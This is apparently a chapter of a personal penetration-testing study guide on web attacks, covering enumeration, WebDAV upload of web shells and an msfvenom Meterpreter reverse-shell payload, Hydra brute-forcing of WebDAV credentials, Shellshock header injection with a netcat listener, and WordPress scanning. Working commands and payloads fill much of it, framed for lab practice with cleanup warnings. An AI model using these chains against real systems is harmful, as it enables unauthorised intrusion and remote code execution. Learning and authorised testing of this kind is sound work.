\chapter{Web Application Attacks}
\label{ch:web_attacks}

Web attacks cover a range of techniques targeting HTTP services --- from directory
enumeration and WebDAV exploitation to Shellshock and CMS vulnerabilities.
Web servers are exposed by design, which makes them a common and productive
attack surface.

% ─────────────────────────────────────────────────────────────────────────────
\section{Web Enumeration Mindset}
\label{sec:web_enum_mindset}

When I find port 80 or 443 open, this is my standard order of checks:

\begin{enumerate}
  \item Open the IP in a browser --- what does it show?
  \item Check \ic{/robots.txt} --- hidden paths the site tells search engines
        to ignore
  \item Run \ic{nmap --script http-enum} --- automated directory and endpoint
        discovery
  \item Check \ic{/phpinfo.php} if PHP is detected --- reveals server config
  \item Look for \ic{/.git/} --- exposed version control repositories
  \item Run \tool{gobuster} or \tool{dirb} for deeper directory brute-force
  \item If a CMS is detected (WordPress, Joomla), run CMS-specific scanners
\end{enumerate}

\begin{termbox}
# Identify web server technology
nmap --script http-enum -sV -p 80,443 target_ip

# Directory brute-force with dirb
dirb http://target_ip
dirb http://target_ip /usr/share/dirb/wordlists/common.txt

# Directory brute-force with gobuster
gobuster dir -u http://target_ip -w /usr/share/dirb/wordlists/common.txt
gobuster dir -u http://target_ip/wp-content -w /usr/share/dirb/wordlists/common.txt

# Download site content for offline analysis
curl -O http://target_ip/interesting_file
wget -r http://target_ip/    # Mirror entire site
\end{termbox}

\screenshot{assets/images/Screenshot_2025-08-25_at_12.05.05_AM.png}{gobuster directory scan finding hidden paths on the target}

% ─────────────────────────────────────────────────────────────────────────────
\section{WebDAV --- Web Distributed Authoring and Versioning}
\label{sec:webdav}

\subsection{What WebDAV Is}

WebDAV is an extension of HTTP that allows clients to perform remote web content
authoring --- uploading, editing, moving, and deleting files on a web server.
When enabled and misconfigured on Microsoft IIS, it becomes a file upload and
remote code execution vector.

\textbf{Why it matters in pentesting:}
\begin{itemize}
  \item A WebDAV share with write permissions = file upload capability
  \item If the server executes \ic{.asp} files = remote code execution
  \item Credentials may be weak or brute-forceable
  \item Combined with Metasploit's IIS WebDAV module = one-click Meterpreter
\end{itemize}

\subsection{Finding WebDAV}

\begin{termbox}
# Check for WebDAV endpoint on port 80
nmap -sV -p 80 --script=http-enum target_ip
# Look for: /webdav/ - 401 Unauthorized

# If http-enum is slow, use dirb
dirb http://target_ip
\end{termbox}

\begin{notebox}
A \ic{401 Unauthorized} response on \ic{/webdav/} is a positive finding ---
it means the endpoint exists and requires credentials. The next step is
credential discovery.
\end{notebox}

\subsection{Testing WebDAV with davtest}

\tool{davtest} tests what file types can be uploaded to a WebDAV server and
which of those get executed by the server.



\begin{termbox}
# Test without credentials (will fail if auth required)
davtest -url http://target_ip/webdav

# Test with credentials
davtest -auth username:password -url http://target_ip/webdav
\end{termbox}

\begin{notebox}

\textbf{What to look for in davtest output:}
\begin{itemize}
  \item \ic{PUT ... SUCCEED} --- file upload works
  \item \ic{EXEC asp SUCCEED} --- ASP files execute on the server (critical for IIS)
  \item \ic{EXEC php SUCCEED} --- PHP execution (critical for Linux LAMP stacks)
\end{itemize}

\screenshot{assets/images/Screenshot_2025-10-18_at_12.39.13_PM.png}{davtest output showing which file types can be uploaded and executed}

\subsection{Manual File Upload with Cadaver}

\tool{Cadaver} is a WebDAV command-line client. Once davtest confirms upload and
execution permissions, Cadaver is used to actually put files on the server.

\begin{termbox}
# Connect to WebDAV share
cadaver http://target_ip/webdav/
# Enter credentials when prompted

# Inside cadaver session
ls                              # List directory contents
put /path/to/file.asp           # Upload a file
delete file.asp                 # Clean up after use
\end{termbox}

\textbf{Uploading a web shell:}

\begin{termbox}
# Kali has built-in web shells
ls -al /usr/share/webshells/

# Upload the ASP web shell
cadaver http://target_ip/webdav/
# Inside cadaver:
put /usr/share/webshells/asp/webshell.asp

# Then access in browser:
# http://target_ip/webdav/webshell.asp
# Execute commands directly from the browser
\end{termbox}

\screenshot{assets/images/Screenshot_2025-10-22_at_5.03.28_PM.png}{Cadaver session uploading webshell.asp to the WebDAV directory}

\screenshot{assets/images/Screenshot_2025-10-25_at_3.30.49_PM.png}{Web shell accessible in browser after upload --- command execution confirmed}

\begin{warnbox}[Clean up after yourself]
Always delete uploaded shells after the engagement:
\end{warnbox}

\begin{termbox}
cadaver http://target_ip/webdav/
delete shell.asp
\end{termbox}

\begin{warnbox}[Clean up after yourself]
Leaving web shells on production servers is a serious security risk and is
unprofessional. Always clean up every artefact.
\end{warnbox}

\subsection{Custom Meterpreter Payload via WebDAV}

Instead of a web shell, a Meterpreter payload gives a full reverse shell with
post-exploitation capabilities.

\begin{termbox}
# Generate custom ASP Meterpreter payload
msfvenom -p windows/meterpreter/reverse_tcp \
  LHOST=my_kali_ip \
  LPORT=1234 \
  -f asp > shell.asp

# Upload via Cadaver
cadaver http://target_ip/webdav/
put /root/shell.asp

# Set up Metasploit listener BEFORE triggering the payload
msfconsole
use multi/handler
set payload windows/meterpreter/reverse_tcp
set LHOST my_kali_ip
set LPORT 1234
run

# Trigger payload by visiting in browser:
# http://target_ip/webdav/shell.asp
# Meterpreter session opens in Metasploit
\end{termbox}

\begin{notebox}[Payload architecture]
Use 32-bit Meterpreter (\ic{windows/meterpreter/reverse\_tcp}) if unsure about
the target architecture. It works on both 32-bit and 64-bit Windows systems.
64-bit payloads only work on 64-bit targets.
\end{notebox}

% ─────────────────────────────────────────────────────────────────────────────
\section{Brute-Forcing WebDAV Credentials with Hydra}
\label{sec:webdav_hydra}

If credentials are not known, Hydra can brute-force HTTP Basic Auth:

\begin{termbox}
hydra -L /usr/share/wordlists/metasploit/common_users.txt \
      -P /usr/share/wordlists/metasploit/common_passwords.txt \
      target_ip http-get /webdav/
\end{termbox}

\begin{notebox}
Brute-forcing can cause server instability or lockouts. In lab environments this
is acceptable --- in real engagements, always check the rules of engagement for
rate limits and lockout policies before running Hydra.
\end{notebox}

\screenshot{assets/images/Screenshot_2025-10-26_at_10.50.35_AM.png}{Hydra brute-forcing WebDAV HTTP Basic Auth}

% ─────────────────────────────────────────────────────────────────────────────
\section{Shellshock --- Apache CGI Bash Vulnerability}
\label{sec:shellshock}

\subsection{What Shellshock Is}

Shellshock (CVE-2014-6271) is a vulnerability in the Bash shell that allows
remote code execution when Bash is invoked via CGI scripts on a web server.
An attacker can inject commands into HTTP headers that Bash executes when
processing the CGI request.

\textbf{Where to look:}
\begin{itemize}
  \item Apache web servers with CGI enabled
  \item URLs ending in \ic{.cgi} or in a \ic{/cgi-bin/} directory
  \item Scripts that invoke Bash to process web requests
\end{itemize}

\subsection{Finding Shellshock}

\begin{termbox}
# Browse to the target IP and look for CGI scripts
# Check for running processes that hint at CGI
# In Burp Suite: intercept a request to a .cgi URL
# Modify the User-Agent header to test:
# User-Agent: () { :; }; echo; /bin/bash -i

# Check if Apache is vulnerable
nmap -sV --script http-shellshock --script-args uri=/cgi-bin/script.cgi target_ip
\end{termbox}

\subsection{Exploiting Shellshock with Burp Suite}

\begin{enumerate}
  \item Open Burp Suite from Kali Applications
  \item Choose Temporary Project $\rightarrow$ Start Burp
  \item Click Proxy tab, ensure Intercept is On
  \item Visit the CGI URL in the browser (through Burp's proxy)
  \item Intercept the request, right-click $\rightarrow$ Send to Repeater
  \item In the Repeater tab, modify a header (e.g., User-Agent) to inject the
        Bash payload
  \item Start a netcat listener: \ic{nc -nvlp 1234}
  \item Click Send --- connection established in the listener
\end{enumerate}

\subsection{Exploiting Shellshock with Metasploit}

\begin{termbox}
search shellshock
use exploit/multi/http/apache_mod_cgi_bash_env_exec
set RHOST target_ip
set LHOST my_ip
set LPORT 4444
set TARGETURI /gettime.cgi    # Actual path to the vulnerable CGI script
exploit
\end{termbox}

\screenshot{assets/images/Screenshot_2025-10-26_at_11.05.50_AM.png}{Shellshock exploit via Metasploit opening reverse shell}

% ─────────────────────────────────────────────────────────────────────────────
\section{WordPress Enumeration}
\label{sec:wordpress}

WordPress runs a huge portion of the web. Misconfigured or outdated WordPress
installations are common targets.

\begin{termbox}
# Identify WordPress
nmap --script http-enum -p 80 target_ip
# Look for: /wp-login.php, /wp-admin/, /wp-content/

# Enumerate users and plugins
wpscan --url http://target_ip
wpscan --url http://target_ip --enumerate u    # Users
wpscan --url http://target_ip --enumerate p    # Plugins

# Directory brute-force within WordPress
gobuster dir -u http://target_ip/wp-content -w /usr/share/dirb/wordlists/common.txt
\end{termbox}

% ─────────────────────────────────────────────────────────────────────────────
\section{Learning Output}

\begin{takebox}
\textbf{What I Learned}
\begin{itemize}
  \item \ic{robots.txt} is the first thing to check on any web server --- it
        voluntarily tells you what the site owner wants to hide.
  \item The davtest $\rightarrow$ cadaver $\rightarrow$ webshell chain is clean
        and reliable. The only variable is whether \ic{.asp} execution is enabled.
  \item Always test ASP execution with davtest before uploading a payload. If asp
        execution fails, the shell will upload but do nothing.
  \item Cleaning up web shells is not optional --- it is part of the job.
\end{itemize}

\textbf{Enumeration Mindset --- When Port 80 is Open}
\begin{enumerate}
  \item Browse to the IP --- what technology is running?
  \item Check \ic{/robots.txt}
  \item Run \ic{nmap --script http-enum} --- look for \ic{/webdav/}, \ic{/.git/},
        \ic{/phpinfo.php}, \ic{/phpmyadmin/}
  \item If WebDAV found: run davtest, then cadaver
  \item If WordPress found: run wpscan
  \item If CGI found: test for Shellshock
\end{enumerate}

\textbf{Common Mistakes}
\begin{itemize}
  \item Not checking if ASP execution works before uploading a Meterpreter payload
  \item Setting the wrong LHOST --- use the VPN interface, not loopback
  \item Forgetting to set up the Metasploit listener before triggering the payload
        in the browser --- the connection has nowhere to go
  \item Leaving web shells on the server after the exercise
\end{itemize}

\textbf{Real-World Impact}
\begin{itemize}
  \item WebDAV write + ASP execution = remote code execution on the web server
  \item Shellshock = unauthenticated command execution on any server running the
        vulnerable Bash version with CGI
  \item Exposed \ic{/.git/} = full source code of the application, including
        hardcoded credentials and API keys
\end{itemize}
\end{takebox}

\end{notebox}